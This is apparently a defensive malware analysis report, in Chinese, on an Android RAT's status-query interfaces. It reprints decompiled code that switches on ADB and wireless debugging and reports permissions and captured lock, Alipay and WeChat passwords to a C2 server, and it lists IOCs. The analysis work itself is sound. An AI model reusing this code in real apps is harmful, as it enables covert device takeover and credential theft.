# Tiangong RAT - APK 状态查询接口审计报告

> **样本**: update.apk (tiangong RAT 家族)
> **审计范围**: ADB WiFi 配对状态查询接口 + 已获取权限信息查询接口
> **审计日期**: 2026-04-20
> **依据文档**: 基础设施层通信审计报告.md

---

## 一、审计结论

| 查询类型 | 是否提供接口 | 接口数量 | 覆盖通道 |
|---------|------------|---------|---------|
| **ADB WiFi 配对状态** | **是** | 6 个 LocalHttpServer 端点 + 1 个 local-service 端点 + 1 个本地轮询类 | LocalHttpServer (7910) / local-service IPC (7912) |
| **已获取权限信息** | **是** | 1 个 WS 命令 + 1 个 HTTP API 上报 + 2 个本地 HTTP 端点 | WS + HTTP + LocalHttpServer 三通道冗余 |

APK 的状态查询设计完全符合审计报告中描述的"三层双通道"冗余架构——每种关键状态都有多个通道可查，确保 C2 在任何通道可用时都能获取设备当前配对和权限情况。

---

## 二、ADB WiFi 配对状态查询接口

### 2.1 架构总览

```
┌─────────────────────────────────────────────────────────────────────┐
│                         C2 服务器                                     │
│                                                                     │
│  可通过以下路径获取 ADB 配对状态:                                       │
│  1. WS command → GET_DEVICE_STATE → deviceState 包含 adb 信息          │
│  2. frp 隧道 → 7910 → /containerState                                │
│  3. frp 隧道 → 7912 → /shareADBConfig                                │
└──────────────────────────────┬──────────────────────────────────────┘
                               │
            ┌──────────────────┼──────────────────┐
            │                  │                  │
  ┌─────────▼─────────┐  ┌────▼────┐  ┌──────────▼──────────┐
  │ Java APK 层        │  │ frp 隧道 │  │ Go local-service    │
  │                    │  │         │  │ :7912               │
  │ LocalHttpServer    │  │ 反向TCP │  │ /shareADBConfig     │
  │ :7910              │  │         │  │ /version            │
  │ /containerState    │  └─────────┘  └─────────────────────┘
  │ /activeWifiDebug   │                         ▲
  │ /closeWifiDebug    │    HTTP IPC             │
  │ /activeADBDebug    │  ─────────────────────► │
  │ /closeADBDebug     │  v00.m214888a0()        │
  │ /noticeAlive       │  探测 7912/version      │
  └────────────────────┘                         │
            │                                    │
            │  SharedPreferences                 │
            │  "system_optimize"                 │
            │  ├─ pair_completed                 │
            │  └─ adb_deploy_enabled             │
            └────────────────────────────────────┘
```

### 2.2 LocalHttpServer 端点（`127.0.0.1:7910`）

#### 2.2.1 `/containerState` — 容器状态查询

**代码位置**: `C0322a7.java:287` → 调用静态方法 `m211586a7()`

**响应结构**:
```json
{
  "code": 200,
  "success": true,
  "data": {
    "accessibilityRunning": true,
    "localHttpServerPort": 7910,
    "localServicePort": 7912
  }
}
```

**分析**: 此端点通过 `localServicePort: 7912` 字段间接反映 local-service 是否已部署。如果 local-service 已部署（即 ADB 配对已完成），该端口会被写入。C2 可据此判断 ADB 通道是否已建立。

**源码**:
```java
// C0322a7.java:816-826 (m211586a7)
public static JSONObject m211586a7() throws JSONException {
    JSONObject jSONObject = new JSONObject();
    jSONObject.put("code", 200);
    jSONObject.put("success", true);
    JSONObject jSONObject2 = new JSONObject();
    jSONObject2.put("accessibilityRunning", true);
    jSONObject2.put("localHttpServerPort", f53086b0);  // 7910
    jSONObject2.put("localServicePort", 7912);
    jSONObject.put("data", jSONObject2);
    return jSONObject;
}
```

#### 2.2.2 `/activeWifiDebug` — 开启无线调试

**代码位置**: `C0322a7.java:311` → `m211627d9(true)`

**功能**: 通过 `Settings.Global.putInt("adb_wifi_enabled", 1)` 开启 Android 无线调试（SDK≥30）

**响应**:
```json
{
  "code": 200,
  "success": true,
  "message": "wifiDebug enabled"
}
```

**源码**:
```java
// C0322a7.java:2025-2039 (m211627d9)
public final JSONObject m211627d9(boolean z) {
    try {
        if (Build.VERSION.SDK_INT >= 30) {
            Settings.Global.putInt(this.f53088a0.getContentResolver(), 
                "adb_wifi_enabled", z ? 1 : 0);
        }
        return m211596e8("wifiDebug ".concat(z ? "enabled" : "disabled"));
    } catch (Exception e) {
        return AbstractC0003a2.m43c4("wifiDebug toggle 异常: ", e.getMessage());
    }
}
```

#### 2.2.3 `/closeWifiDebug` — 关闭无线调试

**代码位置**: `C0322a7.java:327` → `m211627d9(false)`

**功能**: `Settings.Global.putInt("adb_wifi_enabled", 0)`

#### 2.2.4 `/activeADBDebug` — 开启 ADB 调试

**代码位置**: `C0322a7.java:319` → `m211625d7(true)`

**功能**: `Settings.Global.putInt("adb_enabled", 1)` 开启 USB ADB 调试

#### 2.2.5 `/closeADBDebug` — 关闭 ADB 调试

**代码位置**: `C0322a7.java:271` → `m211625d7(false)`

**功能**: `Settings.Global.putInt("adb_enabled", 0)` 关闭 USB ADB 调试

#### 2.2.6 `/noticeAlive` — 存活通告

**代码位置**: `C0322a7.java:535` → `m211616c6()`

**响应结构**:
```json
{
  "code": 200,
  "success": true,
  "message": "alive",
  "data": {
    "accessibilityRunning": true,
    "packageName": "com.storm.safe.rock",
    "timestamp": 1713600000000
  }
}
```

**源码**:
```java
// C0322a7.java:1673-1685 (m211616c6)
public final JSONObject m211616c6() throws JSONException {
    JSONObject jSONObject = new JSONObject();
    jSONObject.put("code", 200);
    jSONObject.put("success", true);
    jSONObject.put("message", "alive");
    JSONObject jSONObject2 = new JSONObject();
    jSONObject2.put("accessibilityRunning", true);
    jSONObject2.put("packageName", this.f53088a0.getPackageName());
    jSONObject2.put("timestamp", System.currentTimeMillis());
    jSONObject.put("data", jSONObject2);
    return jSONObject;
}
```

### 2.3 local-service 端点（`127.0.0.1:7912`）

#### 2.3.1 `/shareADBConfig` — ADB 配对配置共享

**代码位置**: `C0360a2.java:5077`（Java 侧调用方）

**响应结构**:
```json
{
  "data": {
    "debugPort": 5555,
    "paired": true
  }
}
```

**分析**: 这是 **最直接的 ADB 配对状态查询接口**。`paired` 字段明确表示当前配对是否成功，`debugPort` 是已连接的 ADB 无线调试端口。

**调用时机**: `SystemOptimizeManager` 初始化时调用，用于恢复上次配对状态：
```java
// C0360a2.java:5077-5093
if (v00.m214888a0() && (strM212002c8 = m212002c8(this, "/shareADBConfig", null, 6)) != null 
    && strM212002c8.length() > 0) {
    JSONObject data = new JSONObject(strM212002c8).optJSONObject("data");
    if (data != null) {
        int debugPort = data.optInt("debugPort", 0);
        boolean paired = data.optBoolean("paired", false);
        if (debugPort > 0 && paired) {
            m212091k0(debugPort);  // 恢复 ADB 连接
        }
    }
}
```

#### 2.3.2 `/version` — 存活探测

**代码位置**: `v00.java:60`

**功能**: HTTP GET 请求，HTTP 200 = local-service 存活 = ADB 配对+部署已完成

### 2.4 本地状态轮询类 `v00`

**代码位置**: `p000/v00.java`

**职责**: APK 内部判断 ADB 通道是否可用的唯一入口

```java
// v00.java — 完整实现
public abstract class v00 {
    public static volatile boolean f60539a0;    // 缓存状态
    public static volatile long f60540a1;       // 上次检查时间戳

    // 带缓存的快速检查（14+ 处调用）
    public static boolean m214888a0() {
        // Step 1: 读取 SharedPreferences
        boolean z = appContext.getSharedPreferences("system_optimize", 0)
            .getBoolean("adb_deploy_enabled", false);
        if (!z) { f60539a0 = false; return false; }
        
        // Step 2: 缓存有效期判断
        // 已连接: 30s 刷新 / 未连接: 300s 刷新
        long now = System.currentTimeMillis();
        if (now - f60540a1 < (f60539a0 ? 30000L : 300000L)) {
            return f60539a0;
        }
        
        // Step 3: 实际探测
        boolean alive = m214889a1();
        f60539a0 = alive;
        f60540a1 = now;
        return alive;
    }

    // 实际网络探测
    public static boolean m214889a1() {
        // 前置检查: adb_deploy_enabled
        boolean z = appContext.getSharedPreferences("system_optimize", 0)
            .getBoolean("adb_deploy_enabled", false);
        if (z) {
            // HTTP GET http://127.0.0.1:7912/version
            HttpURLConnection conn = (HttpURLConnection) 
                new URL("http://127.0.0.1:7912/version").openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(500);   // 500ms 超时
            conn.setReadTimeout(500);
            return conn.getResponseCode() == 200;
        }
        return false;
    }
}
```

**调用点分布**（14+ 处）:

| 调用位置 | 用途 |
|---------|------|
| `C0323a8.java:1220` (NetworkManager) | 服务器连接成功后同步配置 |
| `C0360a2.java:912` (SystemOptimize) | 配对流程入口判断 |
| `C0360a2.java:3431` | 无线调试状态检查 |
| `C0360a2.java:4749` | ADB 连接重建 |
| `C0360a2.java:5077` | 初始化恢复 shareADBConfig |
| `C0360a2.java:5212` | 配对模式选择 |
| `C0360a2.java:5289` | ADB 连接验证 |
| `RunnableC0029ai.java:264` | 定时任务判断 |
| `l71.java:37` | 心跳任务 |
| `RunnableC0027ag.java:170` | 后台任务调度 |
| `C0620ig.java:242` | 命令路由选择 |
| `c41.java:85,168` | 定时轮询 |

### 2.5 SharedPreferences 持久标记

**SharedPreferences 名**: `"system_optimize"`

| Key | 类型 | 含义 | 写入时机 |
|-----|------|------|---------|
| `pair_completed` | boolean | ADB 配对是否完成 | 配对成功时设为 `true`，FULL_DEPLOY 重置为 `false` |
| `adb_deploy_enabled` | boolean | local-service 是否已部署成功 | 部署成功时设为 `true` |

**写入代码**:
```java
// 配对成功 — C0360a2.java:3161
this.f53816a1.getSharedPreferences("system_optimize", 0).edit()
    .putBoolean("pair_completed", true)
    .putBoolean("adb_deploy_enabled", true)
    .apply();

// FULL_DEPLOY 重置 — C0343a0.java:183
j41Var2.f53816a1.getSharedPreferences("system_optimize", 0).edit()
    .putBoolean("pair_completed", false)
    .commit();
```

### 2.6 ADB 状态查询时序图

```
C2 需要确认 ADB 通道状态:

方式 A（通过 frp 隧道直接查询）:
    C2 ──frp──► 7910:/containerState
                 → {"localServicePort":7912} 表示已部署
    C2 ──frp──► 7912:/shareADBConfig
                 → {"data":{"debugPort":N,"paired":true}} 明确配对状态

方式 B（通过 WS 命令间接查询）:
    C2 ──WS──► FULL_DEPLOY / START_PAIRING
               → handler 内部调用 v00.m214888a0() 判断是否需要重新配对
               → 失败时回报 "请确保设备已完成无线调试配对"

方式 C（被动接收心跳）:
    设备 ──WS──► device_heartbeat（每 10s）
                  NetworkManager.m211653b9() 内检查 v00.m214888a0()
                  如果为 true，同步 local-service 配置到 C2

方式 D（本地决策）:
    APK 内部任何模块:
    if (v00.m214888a0()) {
        // 走 ADB shell 路径（更强权限）
    } else {
        // 走无障碍服务路径（受限权限）
    }
```

---

## 三、已获取权限信息查询接口

### 3.1 架构总览

```
┌─────────────────────────────────────────────────────────────────────┐
│                         C2 服务器                                     │
│                                                                     │
│  获取权限状态的方式:                                                    │
│  1. WS 命令: GET_PERMISSIONS → 主动拉取                               │
│  2. HTTP API: POST /api/sync/status (permissions_update) → 被动推送    │
│  3. WS 推送: permissions_update 类型消息 → 被动推送                     │
│  4. frp → 7910: /accessibilityState → 查无障碍权限                     │
│  5. frp → 7910: /deviceAdmin → 查设备管理员权限                         │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.2 WS 命令：`GET_PERMISSIONS`（主动拉取）

**代码位置**: `C0344a1.java:273` → `AppCommandHandler$handleGetPermissions$2.java`

**触发方式**: C2 通过 WebSocket 下发 `{"type":"command","data":{"command":"GET_PERMISSIONS"}}`

**处理流程**:
```java
// AppCommandHandler$handleGetPermissions$2.java:48-68
public final Object invokeSuspend(Object obj) {
    // 1. 调用 an0.m209824a0() 收集所有权限状态
    Map permissions = an0.m209824a0(uz0Var.f60536a0);
    
    // 2. 构建响应 JSON
    JSONObject jSONObject = new JSONObject();
    jSONObject.put("deviceId", uz0Var.f60536a0.m211470g4());
    jSONObject.put("permissions", new JSONObject(permissions));
    
    // 3. 通过 WS 回传（消息类型 = 混淆后的 "permissions_status"）
    c0323a8.m211658c4(StringUtil.m212470a0("O1wDN0QrHydYPzhmAz9eKAMgRDQ="), jSONObject);
    
    t60.m214714d6("AppCmdHandler", "权限状态已发送: " + permissions);
}
```

**响应结构（WS 消息）**:
```json
{
  "type": "permissions_status",
  "sessionId": "<deviceId>",
  "data": {
    "deviceId": "<deviceId>",
    "permissions": {
      "accessibility": true,
      "overlay": true,
      "notification": true,
      "photo": true,
      "contacts": true,
      "readSms": true,
      "sendSms": true,
      "camera": true,
      "microphone": true,
      "storage": true,
      "appList": true
    }
  },
  "timestamp": 1713600000000
}
```

### 3.3 权限采集核心：`an0.m209824a0()`

**代码位置**: `p000/an0.java:50-86`

**采集的 11 个权限及检测方法**:

| 权限 Key | Android 权限/API | 检测方式 | 说明 |
|----------|-----------------|---------|------|
| `accessibility` | `enabled_accessibility_services` | `Settings.Secure.getString()` 中查找本包名 | 无障碍服务是否已启用 |
| `overlay` | `SYSTEM_ALERT_WINDOW` | `Settings.canDrawOverlays(context)` | 悬浮窗权限 |
| `notification` | `POST_NOTIFICATIONS` | SDK≥33: `checkSelfPermission`; SDK<33: `NotificationManager` | 通知权限 |
| `photo` | `READ_EXTERNAL_STORAGE` / `READ_MEDIA_IMAGES` | SDK≥33: `READ_EXTERNAL_STORAGE`; SDK<33: `READ_MEDIA_IMAGES` | 图片访问（注: 条件与 Android 标准相反，疑为 RAT 代码兼容性 bug） |
| `contacts` | `READ_CONTACTS` | `checkSelfPermission != 0` → granted | 通讯录读取 |
| `readSms` | `READ_SMS` | `checkSelfPermission != 0` → granted | 短信读取 |
| `sendSms` | `SEND_SMS` | `checkSelfPermission != 0` → granted | 短信发送 |
| `camera` | `CAMERA` | `checkSelfPermission != 0` → granted | 相机访问 |
| `microphone` | `RECORD_AUDIO` | `checkSelfPermission != 0` → granted | 麦克风录音 |
| `storage` | `MANAGE_EXTERNAL_STORAGE` / `WRITE_EXTERNAL_STORAGE` | SDK<30: `Environment.isExternalStorageManager()`; SDK≥30: `checkSelfPermission(WRITE_EXTERNAL_STORAGE)` | 存储访问（注: SDK 条件与 Android 标准相反） |
| `appList` | 应用列表权限 | SDK<30: 从 SharedPrefs `app_list_permission` 读取; SDK≥30: 默认 `true` | 应用列表查询 |

**源码**:
```java
// an0.java:50-86 (简化伪码，条件严格按源码)
public static Map m209824a0(Context context) {
    // 1. 无障碍服务检查
    String services = Settings.Secure.getString(contentResolver, "enabled_accessibility_services");
    String ourService = packageName + "/" + dqtvuisjd.class.getName();
    boolean accessibility = services.contains(ourService) || services.contains(name);

    int sdk = Build.VERSION.SDK_INT;
    
    // 2. 构建权限映射（11 项）
    return mapOf(
        new Pair("accessibility", accessibility),
        new Pair("overlay", Settings.canDrawOverlays(context)),
        new Pair("notification", sdk >= 33 ? checkPerm(POST_NOTIFICATIONS)==0 : notifMgrEnabled()),
        // 注: photo/storage/appList 的 SDK 条件与 Android 标准相反（疑为 RAT bug）
        new Pair("photo", sdk >= 33 ? checkPerm(READ_EXTERNAL_STORAGE)==0 : checkPerm(READ_MEDIA_IMAGES)==0),
        new Pair("contacts", checkPerm(READ_CONTACTS) != 0),
        new Pair("readSms", checkPerm(READ_SMS) != 0),
        new Pair("sendSms", checkPerm(SEND_SMS) != 0),
        new Pair("camera", checkPerm(CAMERA) != 0),
        new Pair("microphone", checkPerm(RECORD_AUDIO) != 0),
        new Pair("storage", sdk < 30 ? Environment.isExternalStorageManager() : checkPerm(WRITE_EXTERNAL_STORAGE)==0),
        new Pair("appList", sdk < 30 ? sharedPrefs.getBoolean("app_list_permission", false) : true)
    );
}
```

### 3.4 HTTP 主动上报：`POST /api/sync/status`（被动推送）

**代码位置**: `NetworkManager$sendPermissionsUpdate$1.java`

**触发时机**: 权限状态变更时自动触发（不需 C2 请求）

**双通道上报机制**:
```java
// NetworkManager$sendPermissionsUpdate$1.java:56-119
public final Object invokeSuspend(Object obj) {
    // 1. 收集权限
    Map permissions = an0.m209824a0(context);
    
    // 2. 通道 A: HTTP POST /api/sync/status
    JSONObject httpPayload = new JSONObject();
    httpPayload.put("permissions", new JSONObject(permissions));
    httpManager.uploadDeviceStatus("permissions_update", httpPayload);
    
    // 3. 通道 B: WS 直接推送
    if (wsConnected && dataSyncClient != null) {
        JSONObject wsPayload = new JSONObject();
        wsPayload.put("type", "permissions_update");
        wsPayload.put("deviceId", deviceId);
        wsPayload.put("permissions", new JSONObject(permissions));
        dataSyncClient.send(wsPayload);
    }
}
```

**HTTP 请求结构**:
```
POST /api/sync/status HTTP/1.1
Host: <c2_server>
X-Client-ID: <deviceId>
X-Client-Token: <hmac_32hex>
Content-Type: application/json; charset=utf-8

{
  "deviceId": "<deviceId>",
  "statusType": "permissions_update",
  "data": {
    "permissions": {
      "accessibility": true,
      "overlay": true,
      "notification": false,
      ...
    }
  }
}
```

### 3.5 LocalHttpServer 端点

#### 3.5.1 `/accessibilityState` — 无障碍服务状态

**代码位置**: `C0322a7.java:399` → `m211601a6()`

**响应结构**:
```json
{
  "code": 200,
  "success": true,
  "data": {
    "accessibilityEnabled": true,
    "ourServiceEnabled": true,
    "enabledServices": "com.storm.safe.rock/dqtvuisjd:com.other/Service",
    "settingsServices": "com.storm.safe.rock/....:com.other/...",
    "ourService": "com.storm.safe.rock/com.storm.safe.rock.service.dqtvuisjd",
    "packageName": "com.storm.safe.rock",
    "enabledCount": 2
  }
}
```

**源码**:
```java
// C0322a7.java:1295-1335 (m211601a6)
// 1. 获取系统已启用的无障碍服务列表
AccessibilityManager am = getSystemService("accessibility");
List<AccessibilityServiceInfo> services = am.getEnabledAccessibilityServiceList(FEEDBACK_ALL_MASK);

// 2. 检查我们的服务是否在列表中
boolean ourServiceEnabled = false;
for (AccessibilityServiceInfo info : services) {
    if (info.getResolveInfo().serviceInfo.packageName.equals(getPackageName())) {
        ourServiceEnabled = true;
        break;
    }
}

// 3. 构建所有已启用服务的字符串列表
String enabledServicesStr = join(serviceNames, ":");

// 4. 读取 Settings.Secure 中的配置
String settingsServices = Settings.Secure.getString(
    contentResolver, "enabled_accessibility_services");

// 5. 返回完整状态
jSONObject2.put("accessibilityEnabled", hasAnyService);
jSONObject2.put("ourServiceEnabled", ourServiceEnabled);
jSONObject2.put("enabledServices", enabledServicesStr);
jSONObject2.put("settingsServices", settingsServices);
jSONObject2.put("ourService", packageName + "/" + serviceName);
jSONObject2.put("packageName", packageName);
jSONObject2.put("enabledCount", services.size());
```

#### 3.5.2 `/deviceAdmin` — 设备管理员权限状态

**代码位置**: `C0322a7.java:415` → `m211602a8()`

**响应结构**:
```json
{
  "code": 200,
  "success": true,
  "data": {
    "isAdminActive": 1,
    "isDeviceOwner": 1,
    "isProfileOwner": 0,
    "packageName": "com.storm.safe.rock"
  }
}
```

**源码**:
```java
// C0322a7.java:1338-1358 (m211602a8)
public final JSONObject m211602a8() {
    DevicePolicyManager dpm = (DevicePolicyManager) getSystemService("device_policy");
    ComponentName admin = new ComponentName(context, zbrefryi.class);
    
    JSONObject data = new JSONObject();
    data.put("isAdminActive", dpm.isAdminActive(admin) ? 1 : 0);
    data.put("isDeviceOwner", dpm.isDeviceOwnerApp(getPackageName()) ? 1 : 0);
    data.put("isProfileOwner", dpm.isProfileOwnerApp(getPackageName()) ? 1 : 0);
    data.put("packageName", getPackageName());
    return wrapSuccess(data);
}
```

---

## 四、辅助状态查询接口

### 4.1 WS 命令 `GET_DEVICE_STATE`

**代码位置**: `C0346a3.java:227-265`

**响应字段**:
```json
{
  "deviceId": "<deviceId>",
  "inputBlocked": false,
  "loggingEnabled": true,
  "blackScreenActive": false,
  "appHidden": false,
  "uninstallProtectionEnabled": true
}
```

### 4.2 WS 命令 `GET_PASSWORD_STATUS`

**代码位置**: `C0346a3.java:143-224`

**响应字段**:
```json
{
  "deviceId": "<deviceId>",
  "lockPassword": {
    "detected": true,
    "type": "pin",
    "value": "1234",
    "captureTime": 1713500000000
  },
  "alipayPassword": {
    "captured": true,
    "type": "gesture",
    "value": "...",
    "captureTime": 1713500000000
  },
  "wechatPassword": {
    "captured": false,
    "type": "none",
    "value": "",
    "captureTime": 0
  },
  "statusFileContent": "..."
}
```

### 4.3 LocalHttpServer `/lockState`

**代码位置**: `C0322a7.java:279` → `m211603b0()`

**响应**:
```json
{
  "code": 200,
  "success": true,
  "data": {
    "isLocked": false,
    "isSecure": true
  }
}
```

### 4.4 LocalHttpServer `/netState`

**代码位置**: `C0322a7.java:197` → `m211604b1()`

**响应**:
```json
{
  "code": 200,
  "success": true,
  "data": {
    "connected": true,
    "hasInternet": true,
    "isWifi": true,
    "isCellular": false
  }
}
```

### 4.5 自动上报：锁屏状态

**代码位置**: `NetworkManager$sendScreenLockStatus$1.java`

**双通道推送**（HTTP + WS）:
```json
{
  "type": "screen_lock_status",
  "deviceId": "<deviceId>",
  "isLocked": true,
  "isScreenOn": false
}
```

---

## 五、完整端点清单

### 5.1 LocalHttpServer (`127.0.0.1:7910`) 状态查询类端点

| 端点 | HTTP 方法 | 功能分类 | 返回关键字段 |
|------|----------|---------|------------|
| `/containerState` | GET | ADB 状态 | `localServicePort`, `accessibilityRunning` |
| `/accessibilityState` | GET | 权限状态 | `ourServiceEnabled`, `enabledServices`, `enabledCount` |
| `/deviceAdmin` | GET | 权限状态 | `isAdminActive`, `isDeviceOwner`, `isProfileOwner` |
| `/noticeAlive` | GET | 存活探测 | `accessibilityRunning`, `timestamp` |
| `/lockState` | GET | 设备状态 | `isLocked`, `isSecure` |
| `/netState` | GET | 网络状态 | `connected`, `isWifi`, `isCellular` |
| `/activeWifiDebug` | GET | ADB 控制 | 开启 WiFi 调试 |
| `/closeWifiDebug` | GET | ADB 控制 | 关闭 WiFi 调试 |
| `/activeADBDebug` | GET | ADB 控制 | 开启 ADB |
| `/closeADBDebug` | GET | ADB 控制 | 关闭 ADB |
| `/iconStatus` | GET | UI 状态 | 图标可见性 |
| `/visibility` | GET | UI 状态 | 应用可见性 |
| `/version` | GET | 版本信息 | APK 版本 |

### 5.2 local-service (`127.0.0.1:7912`) 状态端点

| 端点 | 功能 | 返回 |
|------|------|------|
| `/shareADBConfig` | ADB 配对状态 | `debugPort`, `paired` |
| `/version` | 存活探测 | HTTP 200 |

### 5.3 WS 命令（C2 主动拉取）

| 命令 | Handler | 功能 |
|------|---------|------|
| `GET_PERMISSIONS` | `C0344a1` (AppCommandHandler) | 获取 11 项权限布尔映射 |
| `GET_DEVICE_STATE` | `C0346a3` (DeviceStateCommandHandler) | 获取设备运行状态 |
| `GET_PASSWORD_STATUS` | `C0346a3` | 获取密码捕获状态 |
| `DEVICE_PING` | `C0346a3` | 延迟测量 |

### 5.4 自动推送（设备侧触发）

| 事件 | HTTP Path | WS 类型 | 触发条件 |
|------|-----------|---------|---------|
| 权限变更 | `POST /api/sync/status` | `permissions_update` | 权限状态改变时 |
| 锁屏变化 | `POST /api/sync/status` | `screen_lock_status` | KeyguardManager 状态变化 |
| 心跳 | — | `device_heartbeat` | 连接建立/探测响应 |

---

## 七、IOC 汇总（新增）

### 7.1 SharedPreferences IOC

| Preferences 名 | Key | 类型 | IOC 含义 |
|----------------|-----|------|---------|
| `system_optimize` | `pair_completed` | boolean | ADB 配对标记 |
| `system_optimize` | `adb_deploy_enabled` | boolean | local-service 部署标记 |
| `permissions_update` | `app_list_permission` | boolean | 应用列表权限记录 |

### 7.2 Settings.Global 操作 IOC

| Setting Key | 操作 | 代码位置 |
|-------------|------|---------|
| `adb_wifi_enabled` | 读/写 | `C0322a7.java:2030`, `C0360a2.java:3650,3966,5281` |
| `adb_enabled` | 写 | `C0322a7.java` (d7 方法) |
| `development_settings_enabled` | 写 | `C0322a7.java` (d8 方法) |

### 7.3 网络 IOC（状态查询相关）

```
# 本地 HTTP 状态查询
GET http://127.0.0.1:7910/containerState
GET http://127.0.0.1:7910/accessibilityState
GET http://127.0.0.1:7910/deviceAdmin
GET http://127.0.0.1:7910/noticeAlive
GET http://127.0.0.1:7912/shareADBConfig
GET http://127.0.0.1:7912/version

# C2 上报
POST /api/sync/status  (statusType: "permissions_update")
POST /api/sync/status  (statusType: "screen_lock_status")

# WS 消息类型
permissions_update
permissions_status
screen_lock_status
device_heartbeat
```

---

## 八、关键文件索引

| 文件 | 类名/角色 | 相关功能 |
|------|----------|---------|
| `rock/service/modules/C0322a7.java` | LocalHttpServer | HTTP 端点路由 + 状态查询实现 |
| `rock/service/modules/C0323a8.java` | NetworkManager | WS/HTTP 双通道上报协调 |
| `rock/service/modules/setup/C0360a2.java` | SystemOptimizeManager | ADB 配对状态管理 + shareADBConfig 调用 |
| `rock/service/modules/command/C0344a1.java` | AppCommandHandler | GET_PERMISSIONS 命令分发 |
| `rock/service/modules/command/C0346a3.java` | DeviceStateCommandHandler | GET_DEVICE_STATE / GET_PASSWORD_STATUS |
| `rock/service/modules/command/AppCommandHandler$handleGetPermissions$2.java` | GET_PERMISSIONS lambda | 权限采集+回传 |
| `rock/service/modules/NetworkManager$sendPermissionsUpdate$1.java` | 权限更新推送 lambda | 双通道权限上报 |
| `rock/service/modules/NetworkManager$sendScreenLockStatus$1.java` | 锁屏状态推送 lambda | 双通道锁屏上报 |
| `p000/an0.java` | 权限采集工具类 | 11 项权限 boolean map 生成 |
| `p000/v00.java` | ADB 状态轮询器 | 带缓存的 local-service 存活检测 |
| `rock/receiver/zbrefryi.java` | DeviceAdminReceiver | isAdminActive / isDeviceOwner 检查 |
